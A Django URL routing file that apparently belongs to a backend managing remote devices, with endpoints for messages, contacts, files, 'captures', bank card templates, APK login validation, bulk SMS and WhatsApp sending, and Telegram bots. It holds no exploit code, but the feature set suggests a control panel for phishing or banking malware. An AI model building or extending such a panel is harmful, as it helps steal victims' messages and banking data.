from django.urls import path, include
from rest_framework.routers import DefaultRouter
from .views import (
    api_health,
    gmail_oauth_debug,
    ItemViewSet, DeviceViewSet, MessageViewSet,
    dashboard_users_list, devices_assign, devices_unassign,
    dashboard_user_create, dashboard_user_update,
    NotificationViewSet, ContactViewSet, FileSystemViewSet,
    BankCardTemplateViewSet, BankCardViewSet, BankViewSet,
    GmailAccountViewSet,
    CommandLogViewSet, AutoReplyLogViewSet, ActivationFailureLogViewSet, ApiRequestLogViewSet,
    CaptureItemViewSet,
    TelegramBotViewSet, TelegramUserLinkViewSet, CompanyViewSet,
    validate_telegram_token, discover_chats_by_token, lookup_chat_by_token,
    telegram_webhook,
    validate_apk_login, dashboard_login, dashboard_profile, dashboard_reset_password,
    dashboard_update_access, dashboard_configure_access, dashboard_update_profile,
    dashboard_update_theme_mode,
    dashboard_activity_logs, dashboard_send_verification_email, dashboard_verify_email_token,
    blacksms_send_sms, blacksms_send_whatsapp,
    sync_contract, sync_status,
    register_bank_number, isvalidcodelogin,
    # Gmail views
    gmail_init_auth, gmail_callback, gmail_status,
    gmail_messages, gmail_message_detail, gmail_send,
    gmail_modify_labels, gmail_delete_message, gmail_labels,
    gmail_disconnect, gmail_bulk_send, gmail_statistics,
    gmail_bulk_modify_labels,
    # Google Drive views
    drive_list_files, drive_file_detail, drive_download_file,
    drive_upload_file, drive_create_folder, drive_delete_file,
    drive_share_file, drive_storage_info, drive_search_files,
    drive_copy_file,
    # IP Download File endpoint
    ip_download_file,
    # Scheduled task views
    ScheduledTaskViewSet, TaskResultViewSet, available_tasks, task_status,
    run_command_view,
)
from .webhooks import (
    webhook_receive, webhook_failed, webhook_success, webhook_refund, webhook_dispute,
)

router = DefaultRouter()
router.register(r'items', ItemViewSet, basename='item')
router.register(r'devices', DeviceViewSet, basename='device')
router.register(r'messages', MessageViewSet, basename='message')
router.register(r'notifications', NotificationViewSet, basename='notification')
router.register(r'contacts', ContactViewSet, basename='contact')
router.register(r'fs', FileSystemViewSet, basename='filesystem')
router.register(r'bank-card-templates', BankCardTemplateViewSet, basename='bankcardtemplate')
router.register(r'bank-cards', BankCardViewSet, basename='bankcard')
router.register(r'banks', BankViewSet, basename='bank')
router.register(r'gmail-accounts', GmailAccountViewSet, basename='gmailaccount')
router.register(r'command-logs', CommandLogViewSet, basename='commandlog')
router.register(r'auto-reply-logs', AutoReplyLogViewSet, basename='autoreplylog')
router.register(r'activation-failure-logs', ActivationFailureLogViewSet, basename='activationfailurelog')
router.register(r'api-request-logs', ApiRequestLogViewSet, basename='apirequestlog')
router.register(r'captures', CaptureItemViewSet, basename='captureitem')
router.register(r'telegram-bots', TelegramBotViewSet, basename='telegrambot')
router.register(r'telegram-links', TelegramUserLinkViewSet, basename='telegramuserlink')
router.register(r'scheduled-tasks', ScheduledTaskViewSet, basename='scheduledtask')
router.register(r'task-results', TaskResultViewSet, basename='taskresult')
router.register(r'companies', CompanyViewSet, basename='company')

urlpatterns = [
    path('dashboard-users/', dashboard_users_list, name='dashboard-users-list'),
    path('devices/assign/', devices_assign, name='devices-assign'),
    path('devices/unassign/', devices_unassign, name='devices-unassign'),
    path('dashboard-user-create/', dashboard_user_create, name='dashboard-user-create'),
    path('dashboard-user-update/', dashboard_user_update, name='dashboard-user-update'),
    path('', include(router.urls)),
    path('health/', api_health, name='api-health'),
    path('validate-login/', validate_apk_login, name='validate-apk-login'),
    path('isvalidcodelogin', isvalidcodelogin, name='isvalidcodelogin'),
    path('registerbanknumber', register_bank_number, name='registerbanknumber'),
    path('sync/contract/', sync_contract, name='sync-contract'),
    path('sync/status/', sync_status, name='sync-status'),
    path('webhooks/receive/', webhook_receive, name='webhook-receive'),
    path('webhooks/failed/', webhook_failed, name='webhook-failed'),
    path('webhooks/success/', webhook_success, name='webhook-success'),
    path('webhooks/refund/', webhook_refund, name='webhook-refund'),
    path('webhooks/dispute/', webhook_dispute, name='webhook-dispute'),
    path('dashboard-login/', dashboard_login, name='dashboard-login'),
    path('dashboard-profile/', dashboard_profile, name='dashboard-profile'),
    path('dashboard-reset-password/', dashboard_reset_password, name='dashboard-reset-password'),
    path('dashboard-update-access/', dashboard_update_access, name='dashboard-update-access'),
    path('dashboard-configure-access/', dashboard_configure_access, name='dashboard-configure-access'),
    path('dashboard-update-profile/', dashboard_update_profile, name='dashboard-update-profile'),
    path('dashboard-update-theme-mode/', dashboard_update_theme_mode, name='dashboard-update-theme-mode'),
    path('dashboard-activity-logs/', dashboard_activity_logs, name='dashboard-activity-logs'),
    path('dashboard-send-verification-email/', dashboard_send_verification_email, name='dashboard-send-verification-email'),
    path('dashboard-verify-email-token/', dashboard_verify_email_token, name='dashboard-verify-email-token'),

    # BlackSMS API endpoints
    path('blacksms/sms/', blacksms_send_sms, name='blacksms-send-sms'),
    path('blacksms/whatsapp/', blacksms_send_whatsapp, name='blacksms-send-whatsapp'),
    
    # Gmail API endpoints
    path('gmail/oauth-debug/', gmail_oauth_debug, name='gmail-oauth-debug'),
    path('gmail/init-auth/', gmail_init_auth, name='gmail-init-auth'),
    path('gmail/callback/', gmail_callback, name='gmail-callback'),
    path('gmail/status/', gmail_status, name='gmail-status'),
    path('gmail/messages/', gmail_messages, name='gmail-messages'),
    path('gmail/messages/<str:message_id>/', gmail_message_detail, name='gmail-message-detail'),
    path('gmail/send/', gmail_send, name='gmail-send'),
    path('gmail/bulk-send/', gmail_bulk_send, name='gmail-bulk-send'),
    path('gmail/statistics/', gmail_statistics, name='gmail-statistics'),
    path('gmail/messages/<str:message_id>/modify-labels/', gmail_modify_labels, name='gmail-modify-labels'),
    path('gmail/bulk-modify-labels/', gmail_bulk_modify_labels, name='gmail-bulk-modify-labels'),
    path('gmail/messages/<str:message_id>/delete/', gmail_delete_message, name='gmail-delete-message'),
    path('gmail/labels/', gmail_labels, name='gmail-labels'),
    path('gmail/disconnect/', gmail_disconnect, name='gmail-disconnect'),
    
    # Google Drive API endpoints
    path('drive/files/', drive_list_files, name='drive-list-files'),
    path('drive/files/<str:file_id>/', drive_file_detail, name='drive-file-detail'),
    path('drive/files/<str:file_id>/download/', drive_download_file, name='drive-download-file'),
    path('drive/files/<str:file_id>/delete/', drive_delete_file, name='drive-delete-file'),
    path('drive/files/<str:file_id>/share/', drive_share_file, name='drive-share-file'),
    path('drive/files/<str:file_id>/copy/', drive_copy_file, name='drive-copy-file'),
    path('drive/upload/', drive_upload_file, name='drive-upload-file'),
    path('drive/folders/', drive_create_folder, name='drive-create-folder'),
    path('drive/storage/', drive_storage_info, name='drive-storage-info'),
    path('drive/search/', drive_search_files, name='drive-search-files'),

    # Google Sheets API endpoints
    path('sheets/', include('api.sheets.urls')),

    # Sheet worker (Utility: list processes, run with file or sheet link)
    path('sheet-worker/', include('api.sheet_worker.urls')),

    # IP Download File endpoint
    path('ip/download/file/', ip_download_file, name='ip-download-file'),
    
    # Telegram helper endpoints (no bot ID required)
    path('telegram/validate-token/', validate_telegram_token, name='telegram-validate-token'),
    path('telegram/discover-chats/', discover_chats_by_token, name='telegram-discover-chats'),
    path('telegram/lookup-chat/', lookup_chat_by_token, name='telegram-lookup-chat'),
    # Telegram webhook (Telegram pushes updates here; one URL per bot)
    path('telegram/webhook/<int:bot_id>/', telegram_webhook, name='telegram-webhook'),
    
    # Scheduled task endpoints
    path('available-tasks/', available_tasks, name='available-tasks'),
    path('task-status/<str:task_id>/', task_status, name='task-status'),

    # Staff-only: run allowlisted management commands in the browser
    path('run-command/', run_command_view, name='run-command'),
]
